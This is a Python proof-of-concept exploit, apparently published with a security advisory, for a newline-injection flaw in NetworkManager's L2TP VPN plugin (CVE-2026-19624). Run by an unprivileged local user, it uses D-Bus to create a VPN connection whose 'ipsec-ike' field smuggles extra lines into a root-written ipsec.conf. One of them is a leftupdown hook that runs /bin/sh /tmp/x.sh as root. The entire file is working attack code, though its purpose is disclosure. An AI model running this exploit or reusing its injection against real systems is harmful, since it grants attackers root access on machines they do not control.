#!/usr/bin/env python3
#
# LinnemanLabs - nm-l2tp PoC - root exec from newline injection
# CVE-2026-19624
#
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
# https://github.com/linnemanlabs/advisories/
#
# Runs as unprivileged local user. Creates L2TP vpn connection with newline and additional config
# options in vpn.data["ipsec-ike"]. NM(root) -> nm-l2tp-service(root) writes them into
# /run/nm-l2tp-<uuid>/ipsec.conf and loads them as root via `ipsec add`/`ipsec up`.
#
# Env vars:
#   POC_GATEWAY, POC_PSK, POC_IKEV2, POC_RPORT, POC_ESP, POC_LEFTUPDOWN
#
import dbus, uuid, os, getpass, time

# default to our minimal ike responder that listens on 127.0.0.2
GW    = os.environ.get("POC_GATEWAY", "127.0.0.2")
# 0s<base64 of password> - default: "linnemanlabs-poc"
PSK   = os.environ.get("POC_PSK", "0sbGlubmVtYW5sYWJzLXBvYw==")
# IKEv2 loads on libreswan 5.3
IKEV2 = os.environ.get("POC_IKEV2", "yes")
# default to our minimal ike responder that listens on 5500 (unprivileged)
RPORT = os.environ.get("POC_RPORT", "5500")
LUD   = os.environ.get("POC_LEFTUPDOWN", "\"/bin/sh /tmp/x.sh\"")
LPORT = os.environ.get("POC_LPORT", "4500")

NM    = "org.freedesktop.NetworkManager"
# valid proposal for our responder PoC
INJECT = f"aes128-sha256-modp2048\n  leftupdown={LUD}\n  rightikeport={RPORT}\n  leftikeport={LPORT}"

bus = dbus.SystemBus()
mgr = dbus.Interface(bus.get_object(NM, "/org/freedesktop/NetworkManager"), NM)

u = str(uuid.uuid4())
data = {"gateway": GW, "user": "k", "password-flags": "0",
        "ipsec-enabled": "yes", "ipsec-ikev2": IKEV2, "ipsec-ike": INJECT}

con = dbus.Dictionary({
    "connection": dbus.Dictionary({
        "id": "linnemanlabs-poc", "uuid": u, "type": "vpn",
        "permissions": dbus.Array(["user:%s:" % getpass.getuser()], signature="s"),
    }, signature="sv"),
    "vpn": dbus.Dictionary({
        "service-type": "org.freedesktop.NetworkManager.l2tp",
        "data": dbus.Dictionary(data, signature="ss"),
        "secrets": dbus.Dictionary({"password": "k", "ipsec-psk": PSK}, signature="ss"),
    }, signature="sv"),
    "ipv4": dbus.Dictionary({"method": "auto"}, signature="sv"),
    "ipv6": dbus.Dictionary({"method": "auto"}, signature="sv"),
}, signature="sa{sv}")

# persist can be volatile, memory, or disk
# volatile = deleted on deactivate, memory = write to /run/, disk = write to /etc
# dont use disk on Ubuntu, it involves netplan and breaks exploit
opts = dbus.Dictionary({"persist": "volatile"}, signature="sv")

try:
    # AddAndActivateConnection2 returns (settings_path, active_conn_path, result)
    con_path, active_path, result = mgr.AddAndActivateConnection2(con, "/", "/", opts)
    print(f"[+] connection added:     {con_path}")
    print(f"[+] connection activated: {active_path}")
    print(f"[*] uuid: {u}")
except Exception as e:
    print(f"[-] error activating connection: {e}")
